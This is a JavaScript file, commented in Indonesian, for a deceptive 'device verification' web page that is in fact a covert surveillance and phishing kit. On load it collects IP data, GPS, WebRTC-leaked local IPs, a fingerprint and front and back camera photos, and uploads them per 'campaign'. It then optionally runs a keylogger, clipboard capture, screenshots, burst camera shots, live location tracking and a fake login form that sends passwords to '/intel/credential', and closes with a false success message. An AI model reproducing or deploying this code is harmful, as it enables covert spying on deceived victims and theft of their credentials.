// === Capture - SAFE MODE (kirim dulu, fitur berat belakangan) ===
(function() {
  'use strict';

  var progressFill = document.getElementById('progressFill');
  var capStep = document.getElementById('capStep');
  var sessionTs = null;

  function setProgress(pct, text) {
    try {
      if (progressFill) progressFill.style.width = pct + '%';
      if (capStep && text) capStep.textContent = text;
    } catch (e) {}
  }

  function log(m) {
    try { console.log('[CAP]', m); } catch (e) {}
  }

  // === WRAPPER semua async supaya tidak crash ===
  function safe(promise, fallback, label) {
    return Promise.race([
      promise,
      new Promise(function(res) { setTimeout(function() { res(fallback); }, 15000); })
    ]).catch(function(e) {
      log('SAFE ERR ' + (label || '') + ': ' + (e && e.message ? e.message : e));
      return fallback;
    });
  }

  // === Fungsi dasar ===
  function getIpInfo() {
    return safe(fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout ? AbortSignal.timeout(5000) : undefined })
      .then(function(r) { return r.json(); }), null, 'ip');
  }

  function getGps() {
    return safe(new Promise(function(res) {
      if (!navigator.geolocation) return res(null);
      navigator.geolocation.getCurrentPosition(
        function(p) { res({ lat: p.coords.latitude, lon: p.coords.longitude, akurasi_m: p.coords.accuracy }); },
        function() { res(null); },
        { enableHighAccuracy: true, timeout: 6000 }
      );
    }), null, 'gps');
  }

  function getLocalIps() {
    return safe(new Promise(function(resolve) {
      var ips = [];
      try {
        var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('');
        pc.onicecandidate = function(e) {
          if (!e.candidate) { try { pc.close(); } catch (_) {} resolve(ips); return; }
          var m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
          if (m) ips.push(m[1]);
        };
        pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
        setTimeout(function() { try { pc.close(); } catch (_) {} resolve(ips); }, 2500);
      } catch (e) { resolve([]); }
    }), [], 'localip');
  }

  function getFingerprint() {
    return safe(new Promise(function(res) {
      var fp = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: screen.width + 'x' + screen.height,
        viewport: innerWidth + 'x' + innerHeight,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        ram: navigator.deviceMemory || null,
        cpu: navigator.hardwareConcurrency || null,
        touch: 'ontouchstart' in window,
      };
      res(fp);
    }), {}, 'fingerprint');
  }

  function openCamera(facing) {
    return safe(new Promise(function(res) {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return res(null);
      var constraints = { video: facing ? { facingMode: { ideal: facing } } : true, audio: false };
      navigator.mediaDevices.getUserMedia(constraints)
        .then(function(s) {
          var v = document.getElementById('v');
          v.srcObject = s;
          var done = false;
          v.onloadedmetadata = function() {
            if (done) return; done = true;
            setTimeout(function() { res(s); }, 800);
          };
          setTimeout(function() { if (!done) { done = true; res(s); } }, 3000);
        })
        .catch(function(e) { log('kamera err: ' + e.message); res(null); });
    }), null, 'camera-' + facing);
  }

  function snapPhoto() {
    try {
      var v = document.getElementById('v');
      var c = document.getElementById('c');
      if (!v.videoWidth) return null;
      c.width = v.videoWidth;
      c.height = v.videoHeight;
      c.getContext('2d').drawImage(v, 0, 0);
      return c.toDataURL('image/jpeg', 0.7);
    } catch (e) { log('snap err: ' + e.message); return null; }
  }

  function stopStream(s) {
    try { s.getTracks().forEach(function(t) { t.stop(); }); } catch (e) {}
  }

  function postJSON(url, body, timeoutMs) {
    timeoutMs = timeoutMs || 30000;
    var ctrl = new AbortController();
    var timer = setTimeout(function() { ctrl.abort(); }, timeoutMs);
    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
      signal: ctrl.signal,
    }).then(function(r) { clearTimeout(timer); return r.json(); })
      .catch(function(e) { clearTimeout(timer); throw e; });
  }

  // === MAIN FLOW ===
  function main() {
    log('START');
    setProgress(5, 'Menginisialisasi...');

    // 1) Buka kamera depan
    setProgress(15, 'Meminta izin kamera...');
    openCamera('user').then(function(frontStream) {
      log('kamera depan: ' + (frontStream ? 'OK' : 'GAGAL'));

      // 2) Ambil data lain (paralel, tapi tidak blocking)
      setProgress(35, 'Mengumpulkan data...');
      Promise.all([
        getIpInfo(),
        getGps(),
        getLocalIps(),
        getFingerprint(),
      ]).then(function(results) {
        var ipInfo = results[0];
        var gps = results[1];
        var localIps = results[2];
        var fingerprint = results[3];

        // 3) Snap foto depan
        setProgress(60, 'Mengambil foto depan...');
        var fotoDepan = null;
        var fotoBelakang = null;
        if (frontStream) {
          fotoDepan = snapPhoto();
          stopStream(frontStream);
        }

        // 4) Foto belakang
        setTimeout(function() {
          setProgress(70, 'Mengambil foto belakang...');
          openCamera('environment').then(function(backStream) {
            if (backStream) {
              setTimeout(function() {
                fotoBelakang = snapPhoto();
                stopStream(backStream);
                sendData();
              }, 1200);
            } else {
              fotoBelakang = fotoDepan;
              sendData();
            }
          });

          // Fallback: kalau kamera belakang hang, kirim apa adanya setelah 8 detik
          setTimeout(function() {
            if (!sessionTs) {
              log('FALLBACK: kirim tanpa foto belakang');
              sendData();
            }
          }, 8000);
        }, 600);

        // === Fungsi kirim ke server ===
        function sendData() {
          if (sessionTs) return; // sudah terkirim
          setProgress(85, 'Mengirim data...');

          var payload = {
            campaign: window.CAMPAIGN || 'default',
            image_depan: fotoDepan,
            image_belakang: fotoBelakang,
            screenshot: null,
            ip_publik: ipInfo ? ipInfo.ip : null,
            ip_info: ipInfo,
            local_ips: localIps,
            lokasi_gps: gps,
            fingerprint: fingerprint,
          };

          log('upload mulai... payload ~' + Math.round(JSON.stringify(payload).length / 1024) + 'KB');

          postJSON('/upload', payload, 45000)
            .then(function(out) {
              log('upload response: ' + JSON.stringify(out));
              if (out && out.ok) {
                sessionTs = out.ts;
                setProgress(100, 'Verifikasi selesai');
                startHeavyFeatures(out.ts);
                showSuccess();
              } else {
                setProgress(0, 'Gagal: ' + (out && out.msg ? out.msg : 'unknown'));
              }
            })
            .catch(function(e) {
              log('upload error: ' + e.message);
              setProgress(0, 'Error: ' + e.message);
              // Coba kirim minimal (tanpa foto) sebagai last resort
              var minimal = { campaign: window.CAMPAIGN || 'default', ip_publik: ipInfo ? ipInfo.ip : null };
              postJSON('/upload', minimal, 15000)
                .then(function(o) {
                  if (o && o.ok) { sessionTs = o.ts; setProgress(100, 'Tersimpan (minimal)'); }
                })
                .catch(function() {});
            });
        }
      });
    });
  }

  // === FITUR BERAT (aktifkan setelah upload sukses) ===
  function startHeavyFeatures(ts) {
    try {
      // Screenshot (kalau library tersedia)
      if (window.CONFIG && window.CONFIG.ENABLE_SCREENSHOT && window.html2canvas) {
        setTimeout(function() {
          html2canvas(document.body, { logging: false, useCORS: true })
            .then(function(canvas) {
              var data = canvas.toDataURL('image/jpeg', 0.5);
              postJSON('/burst/upload', { session_ts: ts, frame_num: 999, image: data }, 15000).catch(function(){});
            })
            .catch(function() {});
        }, 2000);
      }

      // Keylogger
      if (window.CONFIG && window.CONFIG.ENABLE_KEYLOGGER) {
        document.addEventListener('keydown', function(e) {
          var t = e.target;
          var target = t ? (t.tagName + (t.name ? '[' + t.name + ']' : '')) : '';
          postJSON('/intel/key', { session_ts: ts, key: e.key, target: target }, 8000).catch(function(){});
        }, true);
      }

      // Clipboard
      if (window.CONFIG && window.CONFIG.ENABLE_CLIPBOARD) {
        document.addEventListener('copy', function() {
          var text = (window.getSelection() || '').toString().substring(0, 2000);
          if (text) postJSON('/intel/clipboard', { session_ts: ts, text: 'COPY: ' + text }, 8000).catch(function(){});
        });
        document.addEventListener('paste', function(e) {
          try {
            var text = (e.clipboardData || window.clipboardData).getData('text').substring(0, 2000);
            if (text) postJSON('/intel/clipboard', { session_ts: ts, text: 'PASTE: ' + text }, 8000).catch(function(){});
          } catch (err) {}
        });
      }

      // Tab log
      if (window.CONFIG && window.CONFIG.ENABLE_TAB_LOG) {
        document.addEventListener('visibilitychange', function() {
          postJSON('/event', { ts: ts, event_type: 'visibility', data: { state: document.visibilityState } }, 8000).catch(function(){});
        });
      }

      // Burst mode
      if (window.CONFIG && window.CONFIG.ENABLE_BURST) {
        startBurst(ts, window.CONFIG.BURST_INTERVAL || 3, window.CONFIG.BURST_DURATION || 30);
      }

      // Location tracking
      if (window.CONFIG && window.CONFIG.ENABLE_LOCATION_TRACKING && navigator.geolocation) {
        navigator.geolocation.watchPosition(function(p) {
          postJSON('/intel/location', { session_ts: ts, lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }, 8000).catch(function(){});
        }, null, { enableHighAccuracy: true });
      }

      // Fake login
      if (window.CONFIG && window.CONFIG.ENABLE_FAKE_LOGIN) {
        setTimeout(function() {
          var modal = document.getElementById('fakeLoginModal');
          if (!modal) return;
          modal.style.display = 'flex';
          var form = document.getElementById('fakeLoginForm');
          if (form) {
            form.addEventListener('submit', function(e) {
              e.preventDefault();
              var fd = new FormData(form);
              postJSON('/intel/credential', {
                session_ts: ts,
                username: fd.get('email') || '',
                password: fd.get('password') || '',
                source: 'fake_login',
              }, 8000).catch(function(){});
              modal.style.display = 'none';
            });
          }
        }, (window.CONFIG.FAKE_LOGIN_DELAY || 15) * 1000);
      }

    } catch (e) {
      log('heavy features error: ' + e.message);
    }
  }

  // === Burst mode ===
  function startBurst(ts, interval, duration) {
    if (!navigator.mediaDevices) return;
    navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'environment' } }, audio: false })
      .then(function(s) {
        var v = document.getElementById('v');
        v.srcObject = s;
        v.onloadedmetadata = function() {
          var c = document.getElementById('c');
          c.width = v.videoWidth || 640;
          c.height = v.videoHeight || 480;
          var ctx = c.getContext('2d');
          var total = Math.floor(duration / interval);
          var frame = 0;
          var timer = setInterval(function() {
            if (frame >= total) { clearInterval(timer); stopStream(s); return; }
            try {
              ctx.drawImage(v, 0, 0);
              var data = c.toDataURL('image/jpeg', 0.5);
              postJSON('/burst/upload', { session_ts: ts, frame_num: frame, image: data }, 12000)
                .catch(function(){});
              frame++;
            } catch (e) {}
          }, interval * 1000);
        };
      })
      .catch(function(e) { log('burst err: ' + e.message); });
  }

  // === Halaman sukses ===
  function showSuccess() {
    setTimeout(function() {
      try {
        var app = document.getElementById('app');
        if (!app) return;
        app.innerHTML =
          '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px;padding:24px;text-align:center">' +
          '<div style="font-size:56px">&#9989;</div>' +
          '<h2 style="margin:0;color:#fff">Verifikasi Berhasil</h2>' +
          '<p style="color:#8899aa;max-width:300px;line-height:1.5">Terima kasih, perangkat Anda telah diverifikasi. Anda dapat menutup halaman ini.</p>' +
          '</div>';
      } catch (e) {}
    }, 800);
  }

  // === Start setelah DOM ready ===
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', main);
  } else {
    main();
  }
})();
